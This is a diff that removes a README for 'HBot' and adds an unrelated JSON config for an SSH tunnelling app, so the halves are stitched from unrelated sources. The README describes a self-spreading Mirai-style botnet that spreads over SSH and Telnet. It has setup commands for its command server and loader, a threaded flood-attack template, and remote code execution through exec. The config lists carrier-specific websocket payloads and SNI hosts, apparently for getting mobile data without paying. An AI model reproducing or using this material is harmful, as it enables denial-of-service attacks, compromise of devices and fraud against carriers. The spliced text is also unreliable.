@@ -1,136 +1,241 @@
-<h1 align="center">HBot</h1>
+{
+  "Version": "1.0.0",
+  "ReleaseNotes": "Nova Atualização Disponível",
+  "UrlUpdate": "https://bitbin.it/UlwjRs7l/raw/",
+  "Sms": "https://bitbin.it/oKgMpLx1/raw/",
+  "EmailFeedback": "cloudzinmaker@gmail.com",
+  "UrlContato": "https://t.me/satancloud",
+  "UrlTermos": "Link de termos",
+  "CheckUser": "true",
+  "Udp": [
+    {
+      "Porta": "7300"
+    }
+  ],
+  "Servers": [
+    {
+      "Name": "SOUZA3F⚡ NET",
+      "TYPE": "premium",
+      "FLAG": "br.png",
+      "ServerIP": "br.serverfree2.xyz",
+      "CheckUser": "",
+      "ServerPort": "22",
+      "SSLPort": "443",
+      "USER": "",
+      "PASS": ""
+    }
+  ],
 
-<p align='center'>
-    <b>Self spreading Botnet based on Mirai C&C Arch, spreading through SSH and Telnet protocol.<br>Modern script fullly written in python3.</b><br>
-    <br>
-    <img src='https://media.discordapp.net/attachments/883871285808099329/884117319448682566/unknown.png'>
-</p>
-
-----
-
-<br><br>
-
-> # Warning.
-
-* ***This project was made for educational purposes only! I take no responsibility for anything you do with this program.***
-* ***If you have any suggestions, problems, open a problem (if it is an error, you must be sure to look if you can solve it with [Google](https://giybf.com)!)***
-
-<br>
-
-> # Requirements.
-
-* A **Brain**, *yes skiddie, you need to use your brain, but d'ont worry because [Google](https://giybf.com) is your best friend !*
-* A [MongoDB](https://mongodb.com) account, you must create an **cluster** with **database**, show [tutorial](https://docs.atlas.mongodb.com/getting-started/).
-* A [Ngrok](https://ngrok.com) account, (save your **api-key**)
-* __3__ Open port. Default: **8080**, **1337**, **667**
-* VPS with __Debian__ based distribution.
-* Time..
-
-<br>
-
-> # How to setup.
-
-for the moment you can use that: [https://github.com/Its-Vichy/Mirkat](https://github.com/Its-Vichy/Mirkat)
-
-* *Change the permissions of the scripts with the chmod command.*
-```sh
-chmod +x ./script/*.sh
-```
-
-* *Run installation script.*
-```sh
-./Install.sh
-```
-
-* *Start C&C Master server.*
-```sh
-./RunMaster.sh
-```
-
-* *Start Relay server.*
-* **Note**: If you have more than one VPS, you can run relay on other server.
-```sh
-./RunMaster.sh
-```
-
-* *When you have enough new bots, you can expand your network by starting the loader.*
-```sh
-./Loader.sh
-```
-
-<br>
-
-> # Custom payload.
-
-***If you whant to share your methods, just create pull requests <3***
-
-1. Create your method with the template (*#1*)
-2. You need to add your method in class `Zombie` (**cnc.py** / *#2*)
-3. If you whant to add module (no pypi) you need to follow *#3* in **zombie.py**
-
-
-- #1:
-```py
-import socket, threading, time
-
-__THREAD_NUMBER__ = 500
-
-def method_name(ip: str, port: str, timeout: str):
-    def flood(ip: str, port: int, timeout: int):
-        start_time = int(time.time())
-
-        while int(time.time()) - start_time < timeout:
-            # write method code here
-            # Exemple: https://github.com/Its-Vichy/HBot/blob/main/src/payload/http_flood.py
-
-    for _ in range(int(__THREAD_NUMBER__)):
-        threading.Thread(target= flood, args=(ip, int(port), int(timeout))).start()
-
-method_name('!ip!', '!port!', '!time!')
-```
-
-- #2:
-```py
-def ddos_payload(self, ip: str, port: str, timeout: str, type: str):
-    if type == 'http':
-        payload = self.parse_method('./payload/http_flood.py', ip, port, timeout)
-    
-    if type == 'your method name without space lmao':
-        payload = self.parse_method('./payload/your_method_file.py', ip, port, timeout)
-        
-    self.send(f'run|{payload}')
-```
- 
- - #3
- ```py
- # Just look for this line
- # add: 'module_name': module_name
- # Ex: 'random': random
- threading.Thread(target= exec, args=(payload, {'threading': threading, 'socket': socket, 'time': time, 'module_name': module_name})).start()
- ```
- 
-<br>
-
-> # How is working.
-
-* **Loader**: soon..
-* **Relay**: soon..
-* **C&C**: soon..
-
-<br>
-
-> # Support me.
-
-* ⚠️ If this repository was empty, its because the project stay in **developpement**.
-* Thanks for looking at this repository, if you like to press the ⭐ button!
-* Made with 💖 by [Vichy](https://github.com/Its-Vichy).
-* RCΛ Love u.
-
-<p align="center"> 
-    <b>Informations</b><br>
-    <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/Its-Vichy/HBot?style=social">
-    <img alt="GitHub top language" src="https://img.shields.io/github/languages/top/Its-Vichy/HBot">
-    <img alt="GitHub last commit" src="https://img.shields.io/github/last-commit/Its-Vichy/HBot">
-    <img alt="GitHub" src="https://img.shields.io/github/license/Its-Vichy/HBot">
-    <img alt="GitHub watchers" src="https://img.shields.io/github/watchers/Its-Vichy/HBot?style=social">
-</p>
+"Networks": [
+   {
+      "Name": "💙TIM CLOUD",
+      "FLAG": "tim",
+      "Payload": "GET wss://static.r4you.co  HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "static.r4you.co",
+      "TlsIP": "static.r4you.co",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💙TIM RAIO",
+      "FLAG": "tim",
+      "Payload": "GET wss://blog.alura.com.br  HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "blog.alura.com.br",
+      "TlsIP": "blog.alura.com.br",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💙TIM SPEED",
+      "FLAG": "tim",
+      "Payload": "GET wss://empresas.alura.com.br  HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "empresas.alura.com.br",
+      "TlsIP": "empresas.alura.com.br",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💙TIM REGIOES",
+      "FLAG": "tim",
+      "Payload": "GET wss://www.alura.com.br  HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "www.alura.com.br",
+      "TlsIP": "www.alura.com.br",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💜VIVO CLOUD",
+      "FLAG": "vivo",
+      "Payload": "GET wss://money-staging.infinitepay.io/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: Websocket[crlf]Connection: Keep-Alive[crlf]Connection: Keep-Alive[crlf][crlf]",
+      "SNI": "money-staging.infinitepay.io",
+      "TlsIP": "104.18.7.80",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💜VIVO FAST",
+      "FLAG": "vivo",
+      "Payload": "GET wss://carrinho-pos-familia.vivo.com.br// HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: Websocket[crlf]Connection: Keep-Alive[crlf]Connection: Keep-Alive[crlf][crlf]",
+      "SNI": "carrinho-pos-familia.vivo.com.br",
+      "TlsIP": "104.18.6.80",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💜VIVO NEXT",
+      "FLAG": "vivo",
+      "Payload": "GET wss://help.pornhub.com// HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: Websocket[crlf]Connection: Keep-Alive[crlf]Connection: Keep-Alive[crlf][crlf]",
+      "SNI": "help.pornhub.com",
+      "TlsIP": "162.159.135.63",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💜VIVO NETFLIX",
+      "FLAG": "vivo",
+      "Payload": "GET wss://support.uptodown.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: Websocket[crlf]Connection: Keep-Alive[crlf]Connection: Keep-Alive[crlf][crlf]",
+      "SNI": "support.uptodown.com",
+      "TlsIP": "162.159.136.63",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💜VIVO JOGOS",
+      "FLAG": "vivo",
+      "Payload": "GET wss://support.pokemon.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: Websocket[crlf]Connection: Keep-Alive[crlf]Connection: Keep-Alive[crlf][crlf]",
+      "SNI": "support.pokemon.com",
+      "TlsIP": "172.64.130.2",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💜VIVO YOUTUBE",
+      "FLAG": "vivo",
+      "Payload": "GET wss://checkout.mediafire.com// HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: Websocket[crlf]Connection: Keep-Alive[crlf]Connection: Keep-Alive[crlf][crlf]",
+      "SNI": "checkout.mediafire.com",
+      "TlsIP": "104.24.11.16",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💜VIVO WHATSAPP",
+      "FLAG": "vivo",
+      "Payload": "GET wss://onepiece.com// HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: Websocket[crlf]Connection: Keep-Alive[crlf]Connection: Keep-Alive[crlf][crlf]",
+      "SNI": "onepiece.com",
+      "TlsIP": "172.64.131.2",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "❤️CLARO CLOUD",
+      "FLAG": "claro",
+      "Payload": "GET wss://api.new.livestream.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "api.new.livestream.com",
+      "TlsIP": "api.new.livestream.com",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "❤️CLARO SPEED",
+      "FLAG": "claro",
+      "Payload": "GET wss://ct.livestream.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "ct.livestream.com",
+      "TlsIP": "ct.livestream.com",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "❤️CLARO CHUVA",
+      "FLAG": "claro",
+      "Payload": "GET wss://uploads.api.new.livestream.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "uploads.api.new.livestream.com",
+      "TlsIP": "uploads.api.new.livestream.com",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "❤️CLARO LIVESTREAM",
+      "FLAG": "claro",
+      "Payload": "GET wss://api.new.livestream.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "api.new.livestream.com",
+      "TlsIP": "api.new.livestream.com",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "❤️CLARO FLIX ",
+      "FLAG": "claro",
+      "Payload": "GET wss://lp.livestream.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "lp.livestream.com",
+      "TlsIP": "lp.livestream.com",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "❤️CLARO MUSICA ",
+      "FLAG": "claro",
+      "Payload": "GET wss://vimeo.livestream.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "vimeo.livestream.com",
+      "TlsIP": "vimeo.livestream.com",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "❤️CLARO SPOTIFY ",
+      "FLAG": "claro",
+      "Payload": "GET wss://api.new.livestream.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "api.new.livestream.com",
+      "TlsIP": "api.new.livestream.com",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "❤️CLARO DEEZER",
+      "FLAG": "claro",
+      "Payload": "GET wss://icanhazip.com/ HTTP/1.1[crlf]Host: [app_host][crlf]Upgrade: websocket[crlf][crlf]",
+      "SNI": "icanhazip.com",
+      "TlsIP": "icanhazip.com",
+      "ProxyIP": "",
+      "ProxyPort": "443",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💛OI FAST",
+      "FLAG": "oi",
+      "Payload": "GET ws://www.hbogo.com.br HTTP/1.1\nHost: [app_host]\nUpgrade: ws\n\n",
+      "SNI": "www.hbogo.com.br",
+      "TlsIP": "www.hbogo.com.br",
+      "ProxyIP": "",
+      "ProxyPort": "",
+      "Info": "Tlsws"
+   },
+    {
+      "Name": "💛OI WORLD",
+      "FLAG": "oi",
+      "Payload": "GET ws://www.hbogo.com.br HTTP/1.1\nHost: [app_host]\nUpgrade: ws\n\n",
+      "SNI": "www.hbogo.com.br",
+      "TlsIP": "104.16.53.91",
+      "ProxyIP": "",
+      "ProxyPort": "",
+      "Info": "Tlsws"
+    }
+  ]
+}
